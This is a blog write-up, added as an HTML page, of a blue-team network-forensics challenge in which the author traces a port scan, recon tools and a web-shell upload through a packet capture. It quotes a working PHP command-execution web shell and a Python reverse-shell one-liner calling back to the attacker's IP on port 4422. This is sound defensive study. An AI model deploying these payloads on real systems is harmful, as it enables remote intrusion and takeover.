@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <title> [ BTLO Challenge ] Network Analysis - Web Shell &middot; user@james ~ $ </title>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.90.0" />
+
+
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/nix.css">
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/styles.css">
+
+
+<script src=http://localhost:1313/js/lunr-search.js></script>
+<script src=http://localhost:1313/js/lunr.js></script>
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4T1FV3DWGP"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4T1FV3DWGP');
+</script>
+
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "http:\/\/localhost:1313\/"
+        },
+        "articleSection" : "articles",
+        "name" : "[ BTLO Challenge ] Network Analysis - Web Shell",
+        "headline" : "[ BTLO Challenge ] Network Analysis - Web Shell",
+        "description" : "https:\/\/blueteamlabs.online\/home\/challenge\/12\nContents  Introduction Questions  What is the IP responsible for conducting the port scan activity? What is the port range scanned by the suspicious host? What is the type of port scan conducted? Two more tools were used to perform reconnaissance against open ports, what were they? What is the name of the php file through which the attacker uploaded a web shell? What is the name of the web shell that the attacker uploaded?",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2021",
+        "datePublished": "2021-09-06 00:00:00 \u002b0000 UTC",
+        "dateModified" : "2021-09-06 00:00:00 \u002b0000 UTC",
+        "url" : "http:\/\/localhost:1313\/articles\/digital-forensics\/btlo-challenge-network-analysis-web-shell\/",
+        "wordCount" : "1153",
+        "keywords" : [ "Blog" ]
+    }
+</script>
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+      <a class="navbar-brand" id="green-terminal" href='http://localhost:1313/'>
+        @james ~ $
+      </a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href='http://localhost:1313/'>/home/</a>
+        </li>
+        
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/about">~/about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/achievements">~/achievements</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">articles <span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                        
+                    		<li>
+                    		<a href="http://localhost:1313/articles/digital-forensics">~/digital-forensics</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/offensive-security">~/offensive-security</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/operational-technology">~/operational-technology</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/reviews">~/reviews</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/security-operations">~/security-operations</a>
+				    		</li>
+                		
+            		</ul>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/notes">~/notes</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">projects <span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                        
+                    		<li>
+                    		<a href="http://localhost:1313/projects/arduino">~/arduino</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/projects/bash">~/bash</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/projects/python">~/python</a>
+				    		</li>
+                		
+            		</ul>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/search">~/search</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="flex-wrapper">
+            <div class="container wrapper single">
+                <ol class="breadcrumb">
+  
+  
+    
+  
+    
+  
+    
+  
+  <li>
+    
+      <a href="/">james</a>
+    
+  </li>
+
+  
+  <li>
+    
+      <a href="/articles/">articles</a>
+    
+  </li>
+
+  
+  <li>
+    
+      <a href="/articles/digital-forensics/">digital forensics</a>
+    
+  </li>
+
+  
+  <li>
+    
+      [ BTLO Challenge ] Network Analysis - Web Shell
+    
+  </li>
+
+</ol>
+
+
+
+                <h1><a href="http://localhost:1313/articles/digital-forensics/btlo-challenge-network-analysis-web-shell/">[ BTLO Challenge ] Network Analysis - Web Shell</a></h1>
+                <span class="post-date">2021-09-06 </span>
+                <div class="post-content">
+                    <p><a href="https://blueteamlabs.online/home/challenge/12" target="_blank">https://blueteamlabs.online/home/challenge/12</a></p>
+<h2 id="contents">Contents</h2>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#questions">Questions</a>
+<ul>
+<li><a href="#what-is-the-ip-responsible-for-conducting-the-port-scan-activity">What is the IP responsible for conducting the port scan activity?</a></li>
+<li><a href="#what-is-the-port-range-scanned-by-the-suspicious-host">What is the port range scanned by the suspicious host?</a></li>
+<li><a href="#what-is-the-type-of-port-scan-conducted">What is the type of port scan conducted?</a></li>
+<li><a href="#two-more-tools-were-used-to-perform-reconnaissance-against-open-ports-what-were-they">Two more tools were used to perform reconnaissance against open ports, what were they?</a></li>
+<li><a href="#what-is-the-name-of-the-php-file-through-which-the-attacker-uploaded-a-web-shell">What is the name of the php file through which the attacker uploaded a web shell?</a></li>
+<li><a href="#what-is-the-name-of-the-web-shell-that-the-attacker-uploaded">What is the name of the web shell that the attacker uploaded?</a></li>
+<li><a href="#what-is-the-parameter-used-in-the-web-shell-for-executing-commands">What is the parameter used in the web shell for executing commands?</a></li>
+<li><a href="#what-is-the-first-command-executed-by-the-attacker">What is the first command executed by the attacker?</a></li>
+<li><a href="#what-is-the-type-of-shell-connection-the-attacker-obtains-through-command-execution">What is the type of shell connection the attacker obtains through command execution?</a></li>
+<li><a href="#what-is-the-port-he-uses-for-the-shell-connection">What is the port he uses for the shell connection?</a></li>
+</ul>
+</li>
+<li><a href="#comments">Comments?</a></li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<p>The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.</p>
+<h2 id="questions">Questions</h2>
+<h3 id="what-is-the-ip-responsible-for-conducting-the-port-scan-activity">What is the IP responsible for conducting the port scan activity?</h3>
+<p>Having a quick look down the packets, there are a huge number of grey and red lines (this is determined by Wireshark in Coloring Rules&hellip; in the View menu). These are <code>SYN</code> and <code>RST, ACK</code> packets . For a normal connection there would be <code>SYN, ACK</code> and <code>ACK</code> too, but these don&rsquo;t.</p>
+<p>We can filter just for these:</p>
+<p><code>tcp.flags==0x002 || tcp.flags==0x014</code></p>
+<p>(I found these codes by looking within the Packet Details box, under Transmission Control Protocol, then Flags)</p>
+<p>The <code>SYN</code> packets are all from <code>10.251.96.4</code> to <code>10.251.96.5</code>, and the <code>RST, ACK</code> in the reverse direction.</p>
+<p>So <code>10.251.96.4</code> is doing the scanning.</p>
+<h3 id="what-is-the-port-range-scanned-by-the-suspicious-host">What is the port range scanned by the suspicious host?</h3>
+<p>Let&rsquo;s filter just for these scan packets:</p>
+<p><code>ip.src==10.251.96.4 &amp;&amp; tcp.flags==0x002</code></p>
+<p>This gives us the scan (grey lines), then some green lines. These are for TCP port 80 and presumably the connection(s) made after the scan was complete.</p>
+<p>Select a packet and in the Packet Details box, expand Transmission Control Protocol, right click on Destination Port, then Apply as Column. Then, if you click this new column, it will sort by DPort.</p>
+<p>The first one is 1, and the last is 1024.</p>
+<h3 id="what-is-the-type-of-port-scan-conducted">What is the type of port scan conducted?</h3>
+<p>This scan is sending <code>SYN</code> packets, but not finalising the connection (i.e. no three-way handshake). This is typical of a TCP SYN scan.</p>
+<h3 id="two-more-tools-were-used-to-perform-reconnaissance-against-open-ports-what-were-they">Two more tools were used to perform reconnaissance against open ports, what were they?</h3>
+<p>While this can be done in Wireshark, Tshark (the command-line version is actually easier). I did it in Linux as Terminal is often superior than Command Prompt and PowerShell for data manipulation.</p>
+<p>A good way to find tools is to check the User Agents. Of course there are Chrome and Firefox etc, but tools such as nmap will often state what they are.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tshark -r BTLOPortScan.pcap -T fields -e http.user_agent | sort | uniq -c
+  <span style="color:#ae81ff">12617</span>
+      <span style="color:#ae81ff">3</span> Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>internal dummy connection<span style="color:#f92672">)</span>
+     <span style="color:#ae81ff">94</span> Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/88.0.4324.146 Safari/537.36
+     <span style="color:#ae81ff">32</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:68.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/68.0
+   <span style="color:#ae81ff">4615</span> gobuster/3.0.1
+    <span style="color:#ae81ff">147</span> sqlmap/1.4.7#stable <span style="color:#f92672">(</span>http://sqlmap.org<span style="color:#f92672">)</span>
+</code></pre></div><p>First tshark reads (<code>-r</code>) the file. The <code>T</code> tells it what to filter by, in this case <code>fields</code>, and the <code>-e</code> tells it which <code>fields</code> - in this case, <code>http.user_agent</code>. Next, pipe to Terminal commands <code>| sort | uniq -c</code>.</p>
+<p>Note if you search <code>http.user_agent</code> in Wireshark, it would display all packets with this field present - but that doesn&rsquo;t make extracting that data easier. Tshark and Wireshark use the same field names e.g. <code>tcp.flags</code>, <code>ip.src</code>.</p>
+<p>Looking at the output, there are two well-known recon tools that stand out: <code>Gobuster 3.0.1</code> and <code>sqlmap 1.4.7</code>.</p>
+<h3 id="what-is-the-name-of-the-php-file-through-which-the-attacker-uploaded-a-web-shell">What is the name of the php file through which the attacker uploaded a web shell?</h3>
+<p>An upload would be done through a POST request, which we can filter for:</p>
+<p><code>http.request.method==POST</code></p>
+<p>We get a lot of <code>HTML Form URL Encoded: application/x-www-form-urlencoded</code>, which we can see are brute forces by sqlmap. Let&rsquo;s filter these out by right-clicking the User-Agent section (Packet Details → Hypertext Transfer Protocol) then Apply as Filter → &hellip;and not Selected. This gives us the following filter:</p>
+<p><code>(http.request.method==POST) &amp;&amp; !(http.user_agent == &quot;sqlmap/1.4.7#stable (http://sqlmap.org)&quot;)</code></p>
+<p>Now we have only four packets! Two for <code>login.php</code> and two for <code>upload.php</code>.</p>
+<p>Initially I thought <code>upload.php</code> was the answer, but I had to look a bit deeper.</p>
+<p>What we actually need is the referer. This is also found within Hypertext Transfer Protocol within Packet Details. This gives us:</p>
+<p><code>Referer: http://10.251.96.5/editprofile.php\\r\\n</code></p>
+<p>So, <code>editprofile.php</code> uses <code>upload.php</code> to upload things. Makes sense.</p>
+<h3 id="what-is-the-name-of-the-web-shell-that-the-attacker-uploaded">What is the name of the web shell that the attacker uploaded?</h3>
+<p>The files uploaded via <code>upload.php</code> are found within the <code>MIME</code> section within the Packet Details. Specifically, we&rsquo;re looking for <code>Content-Disposition</code> (or, put another way, anything that includes a filename!)</p>
+<p>The two files are:</p>
+<p><code>myphoto.png</code></p>
+<p><code>dbfunctions.php</code></p>
+<p>It&rsquo;s more likely a web shell is php than png.</p>
+<p>Let&rsquo;s see how the php file was used. A simple, broad search is:</p>
+<p><code>frame contains dbfunctions.php</code></p>
+<p>Yeah, some of that looks like web shell activity! For comparison, the same search for <code>myphoto.png</code> gives nothing except the actual upload.</p>
+<h3 id="what-is-the-parameter-used-in-the-web-shell-for-executing-commands">What is the parameter used in the web shell for executing commands?</h3>
+<p>The previous <code>frame contains</code> search shows it was used three times (in the pcap at least):</p>
+<ul>
+<li><code>Request URI: /uploads/dbfunctions.php?cmd=id</code></li>
+<li><code>Request URI: /uploads/dbfunctions.php?cmd=whoami</code></li>
+<li><code>Request URI: /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</code></li>
+</ul>
+<p><code>cmd</code> it is.</p>
+<p>Alternatively, we can see the content of the web shell itself, as it was uploaded over HTTP (i.e. unencrypted). If we follow the stream (right click the <code>POST /upload.php HTTP/1.1 (application/x-php)</code> packet, then Follow → TCP Stream), we can see the web shell consists of:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]) ){
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span>;
+$cmd <span style="color:#f92672">=</span> ($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+<span style="color:#a6e22e">system</span>($cmd);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
+<span style="color:#66d9ef">die</span>;
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>A nice, simple, <code>cmd</code>-based backdoor.</p>
+<h3 id="what-is-the-first-command-executed-by-the-attacker">What is the first command executed by the attacker?</h3>
+<p>We already have this from above - <code>id</code>.</p>
+<h3 id="what-is-the-type-of-shell-connection-the-attacker-obtains-through-command-execution">What is the type of shell connection the attacker obtains through command execution?</h3>
+<p>There are two common types of shell, reverse shell and bind shell.</p>
+<p>A bind shell is when the attacker connects to the target (the target is configured to listen for an incoming connection).</p>
+<p>A reverse shell is when the target connects to the attacker.</p>
+<p>In this case, the shell relates to the <code>python</code> command. Putting it through CyberChef to URL decode it, then formatting it so it&rsquo;s easier to read, we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os
+s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.251.96.4&#34;</span>,<span style="color:#ae81ff">4422</span>))
+os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>])
+</code></pre></div><p>You&rsquo;ll need to know a little about Python and shells to fully understand this, but this is a reverse shell, that reaches out to (i.e. <code>connect</code>s to) <code>10.251.96.4</code> (i.e. the attacker&rsquo;s machine) on port <code>4422</code>.</p>
+<p>The pcap logs also show traffic initiated by the target machine going to <code>10.251.96.4:4422</code>.</p>
+<h3 id="what-is-the-port-he-uses-for-the-shell-connection">What is the port he uses for the shell connection?</h3>
+<p>Again, we already have this from the previous question - <code>4422</code>.</p>
+<h2 id="comments">Comments?</h2>
+<p>Feel free to comment on my <a href="https://www.linkedin.com/posts/jamgib_btlo-challenge-network-analysis-web-activity-6840569024884146176-Lpvq" target="_blank">LinkedIn post</a></p>
+
+                </div>
+                
+                <div class="post-comments">
+                    
+                </div>
+                
+            </div>
+            <footer class="footer text-center">
+<p>Copyright &copy; 2022 James -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+        </div>
+    </body>
